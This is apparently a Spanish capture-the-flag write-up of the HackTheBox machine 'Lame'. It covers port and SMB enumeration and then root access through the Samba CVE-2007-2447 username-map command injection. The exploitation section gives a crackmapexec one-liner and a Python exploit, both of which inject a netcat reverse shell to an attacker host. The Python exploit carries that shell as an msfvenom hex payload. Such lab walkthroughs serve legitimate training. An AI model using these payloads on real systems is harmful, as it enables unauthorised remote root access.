---
title: 'Lame Write Up [OSCP-Style]'
disqus: HackTheBox 
---

Lame WRITE UP [OSCP-Style]
===

Hecho por @xlcc4096 y @CapitanJ4ck21

## Indice 

[TOC]

> Lame es una máquina de HackTheBox la cual tiene una un servicio Samba 3.0.20 instalado el cual es vulnerable a `CVE-2007-2447` y conseguimos acceso al usuario root aprovechandonos de esta a través de un exploit hecho por nosotros.

## Enumeración
### Escaneo de puertos
Empezamos escaneando todo el rango de puertos TCP de la máquina.
```bash=
nmap -p- --min-rate 5000 --open -Pn 10.10.10.3
````

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-06 18:54 CET
Nmap scan report for 10.10.10.3
Host is up (0.034s latency).
Not shown: 65530 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```
Recogemos los puertos abiertos y le hacemos un escaneo a estos mas a fondo a través de un escaneo de servicios y especificamos también que pase scripts de enumeración por defecto en cada puerto.
```bash=
nmap -p 21,22,139,445 -sV -sC -oN scan/target -Pn 10.10.10.3
```

```

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: 2h30m38s, deviation: 3h32m08s, median: 37s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-12-06T10:50:18-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

### Puerto FTP - 21 / TCP

Como buena práctica es bueno probar de loguearnos con el usuario anonymous. Ya que a veces `nmap` no lo detecta. Nos logeamos como usuario Anonymous y vemos que no hay nada disponible en el servidor FTP.

```bash=
ftp 10.10.10.3
``` 
```
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:capi): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> binary
200 Switching to Binary mode.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> pwd
257 "/"
ftp> exit
221 Goodbye.
```

### Puerto Samba - 139, 445 / TPC 

Lo siguiente que vamos a enumerar es el servicio SMB.
Para enumerar este puerto, les comparto una pequeña lista para poder listar los directorios. 
```
cme smb <ip> -u '' -p '' --shares
smbmap -H <ip>
nmap --script smb-enum-shares -p 139,445 <ip>
echo exit | smbclient -L \\\\<ip>
```
Enumeramos con crackmapexec, y sacamos que la versión del Samba es 3.0.20.
```bash=
cme smb 10.10.10.3 -u '' -p '' --shares
```
```python=
SMB         10.10.10.3      445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
SMB         10.10.10.3      445    LAME             [+] hackthebox.gr\: 
SMB         10.10.10.3      445    LAME             [+] Enumerated shares
SMB         10.10.10.3      445    LAME             Share           Permissions     Remark
SMB         10.10.10.3      445    LAME             -----           -----------     ------
SMB         10.10.10.3      445    LAME             print$                          Printer Drivers
SMB         10.10.10.3      445    LAME             tmp             READ,WRITE      oh noes!
SMB         10.10.10.3      445    LAME             opt                             
SMB         10.10.10.3      445    LAME             IPC$                            IPC Service (lame server (Samba 3.0.20-Debian))
SMB         10.10.10.3      445    LAME             ADMIN$                          IPC Service (lame server (Samba 3.0.20-Debian))

```
Enumeramos el servicio con `smbmap` también y nos devuelve que la versión es la misma que habiamos recogido antes.
```bash=
smbmap -H 10.10.10.3 -R 
```
```
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        .\tmp\*
        dr--r--r--                0 Sun Dec  6 20:23:59 2020    .
        dw--w--w--                0 Sat Oct 31 08:33:57 2020    ..
        dw--w--w--                0 Sun Dec  6 12:25:30 2020    orbit-makis
        dr--r--r--                0 Sun Dec  6 07:15:21 2020    .ICE-unix
        dw--w--w--                0 Sun Dec  6 07:15:54 2020    vmware-root
        dr--r--r--                0 Sun Dec  6 07:15:48 2020    .X11-unix
        dw--w--w--                0 Sun Dec  6 12:25:30 2020    gconfd-makis
        fr--r--r--                0 Sun Dec  6 18:00:36 2020    vtrm
        fw--w--w--               11 Sun Dec  6 07:15:48 2020    .X0-lock
        fw--w--w--                0 Sun Dec  6 07:16:26 2020    5544.jsvc_up
        fw--w--w--             1600 Sun Dec  6 07:15:19 2020    vgauthsvclog.txt.0
        .\tmp\.X11-unix\*
        dr--r--r--                0 Sun Dec  6 07:15:48 2020    .
        dr--r--r--                0 Sun Dec  6 20:23:59 2020    ..
        fr--r--r--                0 Sun Dec  6 07:15:48 2020    X0
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```

## Explotación
Gracias a la anterior enumeración encontramos que es vulnerable a `CVE-2007-2447` asi que vamos a explotarlo de diferentes formas.

### Samba - CVE-2007-2447
La primera forma de la que vamos a explotar esta vulnerabilidad es con crackmapexec:
```bash=
cme smb 10.10.10.3 -u '/=`nohup rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 53 >/tmp/f`' -p ''
```

De la segunda forma que vamos que explotar es creando un exploit para aprovecharnos de esta vulnerabilidad.
Hemos subido el exploit a github para que podais utilizarlo.
https://github.com/xlcc4096/exploit-CVE-2007-2447
```python=
#!/usr/bin/python3
# Usage: python3 exploit-CVE-2007-2447.py <HOST> <PORT>
# Made by @xlcc @J4ck21

from smb.SMBConnection import SMBConnection
import sys

# msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.3 LPORT=31337 -f python
buf =  b""
buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x64"
buf += b"\x78\x63\x78\x70\x79\x77\x3b\x20\x6e\x63\x20\x31\x30"
buf += b"\x2e\x31\x30\x2e\x31\x34\x2e\x33\x20\x33\x31\x33\x33"
buf += b"\x37\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x64\x78\x63\x78"
buf += b"\x70\x79\x77\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68"
buf += b"\x20\x3e\x2f\x74\x6d\x70\x2f\x64\x78\x63\x78\x70\x79"
buf += b"\x77\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74"
buf += b"\x6d\x70\x2f\x64\x78\x63\x78\x70\x79\x77"

server_ip=sys.argv[1]
port=int(sys.argv[2])

user="/=`nohup " +  buf.decode() + "`"
password=""
client_machine_name=""
server_name=""
domain_name=""

conn = SMBConnection(user, password, client_machine_name, server_name, domain=domain_name, use_ntlm_v2=True, is_direct_tcp=True)

conn.connect(server_ip,port)
```
https://amriunix.com/post/cve-2007-2447-samba-usermap-script/

Ejecutamos el script de la siguiente manera:
```bash=
python3 exploit-CVE-2007-2447.py 10.10.10.3 445
```
Ponemos a la escucha el puerto 31337 con netcat:
NOTA: Tu tendras que poner a la escucha el puerto que hayas especificado a la hora de generar el payload.
```bash=
nc -lnvp 31337
listening on [any] 31337 ...
```
Ejecutamos el script y ya somos root :)
```
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.3] 50277
id
uid=0(root) gid=0(root) groups=0(root)
wc -c /root/root.txt
33 /root/root.txt
```